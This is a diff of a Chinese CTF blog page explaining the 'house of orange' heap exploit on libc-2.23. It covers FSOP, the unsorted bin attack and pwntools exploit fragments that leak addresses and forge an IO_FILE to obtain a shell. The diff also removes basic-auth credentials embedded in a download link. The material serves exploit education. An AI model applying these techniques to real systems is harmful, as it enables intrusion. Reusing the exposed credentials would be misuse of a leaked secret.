@@ -81,7 +81,7 @@
               ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item">
               <a
                 class="menu-link"
-                href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                href="https://download.roderickchan.cn/"
                 title="我的资源下载中心"
                 rel="noopener noreferrer" target="_blank"
               ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
@@ -168,7 +168,7 @@
               class="menu-item"
             ><a
                   class="menu-link"
-                  href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                  href="https://download.roderickchan.cn/"
                   title="我的资源下载中心"
                   rel="noopener noreferrer" target="_blank"
                 ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li
@@ -357,7 +357,7 @@
 <h5 id="fsop">FSOP</h5>
 <p>其实<code>FSOP</code>的利用方式有很多，结合不同的版本，不同的调用流程，攻击方法也不一样。这里主要谈一下<code>64</code>位下，<code>libc-2.23.so</code>中伪造<code>IO_FILE</code>结构和<code>vtable</code>，触发<code>IO_flush_all_lockup</code>刷新所有流进行攻击的方式。</p>
 <p><strong>1、IO_FILE结构</strong></p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-1"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -420,11 +420,10 @@
 </span></span><span class="line"><span class="cl">0xb8  __pad5
 </span></span><span class="line"><span class="cl">0xc0  _mode
 </span></span><span class="line"><span class="cl">0xc4  _unused2
-</span></span><span class="line"><span class="cl">0xd8  vtable
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">0xd8  vtable</span></span></code></pre></td></tr></table>
 </div>
 </div><p><code>vtable</code>的函数指针为：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-2"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -473,11 +472,10 @@
 </span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="n">_IO_default_stat</span><span class="p">),</span>
 </span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">showmanyc</span><span class="p">,</span> <span class="n">_IO_default_showmanyc</span><span class="p">),</span>
 </span></span><span class="line"><span class="cl">  <span class="nf">JUMP_INIT</span><span class="p">(</span><span class="n">imbue</span><span class="p">,</span> <span class="n">_IO_default_imbue</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">};</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><code>malloc_printerr</code>最终调用到<code>IO_flush_all_lock</code>，源码位于<code>libio\vswprintf.c:795</code></p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-3"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -544,8 +542,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>	   <span class="p">)</span><span class="c1">// 前面的或语句为真的时候，才会执行到_IO_OVERFLOW(fp, EOF)
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="o">&amp;&amp;</span> <span class="nf">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">	<span class="n">result</span> <span class="o">=</span> <span class="n">EOF</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="err">······</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">    <span class="err">······</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>要想执行到<code>_IO_OVERFLOE</code>，要么滿足<code>fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>，要么滿足<code>_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</code>，一般来说，前面的条件好构造一点。</p>
 <h5 id="unsorted-bin-attack">unsorted bin attack</h5>
@@ -556,7 +553,7 @@
 </li>
 <li>
 <p>如果申请的大小在<code>largebin</code>的范围内，那么在解链<code>unsorted bin</code>的时候，会先把<code>unsorted bin chunk</code>放在<code>large bin</code>中，就会在<code>fd_nextsize</code>和<code>bk_nextsize</code>上留下堆地址</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-4"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -587,8 +584,7 @@
 </span></span><span class="line"><span class="cl">              <span class="err">······</span>
 </span></span><span class="line"><span class="cl">              <span class="c1">// 这里会被置为，留下堆地址
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>              <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">victim</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">          <span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span></span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 </ul>
@@ -607,7 +603,7 @@
 <ul>
 <li>
 <p>1、定义好各个函数</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-5"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -658,13 +654,12 @@
 </span></span><span class="line"><span class="cl">    <span class="n">sh</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Name:&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Price of Orange: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">price</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">    <span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Color of Orange: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">color</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Finish</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Finish</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 <li>
 <p>1、修改<code>top chunk</code>的<code>size</code>，触发<code>house of orange</code></p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-6"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -677,14 +672,13 @@
 </span></span><span class="line"><span class="cl"><span class="n">upgrade_house</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;a&#34;</span> <span class="o">*</span> <span class="mh">0x38</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfa1</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># house of orange</span>
-</span></span><span class="line"><span class="cl"><span class="n">build_house</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span> <span class="s2">&#34;cccc&#34;</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">build_house</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span> <span class="s2">&#34;cccc&#34;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424131633824.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424131633824.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424131633824.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424131633824.png 2x" sizes="auto" data-title="image-20210424131633824" data-alt="image-20210424131633824" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 </li>
 <li>
 <p>2、泄露出<code>libc</code>地址和<code>heap</code>地址</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-7"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -717,15 +711,14 @@
 </span></span><span class="line"><span class="cl"><span class="n">msg</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">see_house</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="n">heap_addr</span> <span class="o">=</span> <span class="n">msg</span><span class="p">[</span><span class="mh">0x20</span><span class="p">:</span><span class="mh">0x26</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="n">heap_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">heap_addr</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="n">LOG_ADDR</span><span class="p">(</span><span class="s2">&#34;heap_addr&#34;</span><span class="p">,</span> <span class="n">heap_addr</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">LOG_ADDR</span><span class="p">(</span><span class="s2">&#34;heap_addr&#34;</span><span class="p">,</span> <span class="n">heap_addr</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424131739783.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424131739783.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424131739783.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424131739783.png 2x" sizes="auto" data-title="image-20210424131739783" data-alt="image-20210424131739783" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424131803079.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424131803079.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424131803079.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424131803079.png 2x" sizes="auto" data-title="image-20210424131803079" data-alt="image-20210424131803079" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 </li>
 <li>
 <p>3、触发<code>unsortedbin attack</code>，并伪造<code>IO_FILE</code>结构，刷新流拿到<code>shell</code></p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-8"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -756,8 +749,7 @@
 </span></span><span class="line"><span class="cl">                <span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">upgrade_house</span><span class="p">(</span><span class="mh">0x600</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Your choice : &#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424132343300.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424132343300.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424132343300.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424132343300.png 2x" sizes="auto" data-title="image-20210424132343300" data-alt="image-20210424132343300" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424132411045.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424132411045.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424132411045.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210424132411045.png 2x" sizes="auto" data-title="image-20210424132411045" data-alt="image-20210424132411045" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
@@ -767,7 +759,7 @@
 </li>
 </ul>
 <h4 id="完整exp">完整exp</h4>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-9"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -924,8 +916,7 @@
 </span></span><span class="line"><span class="cl">                <span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">upgrade_house</span><span class="p">(</span><span class="mh">0x600</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Your choice : &#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="引用与参考">引用与参考</h3>
 <p>1、<a href="https://roderickchan.github.io"target="_blank" rel="external nofollow noopener noreferrer">My Blog<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
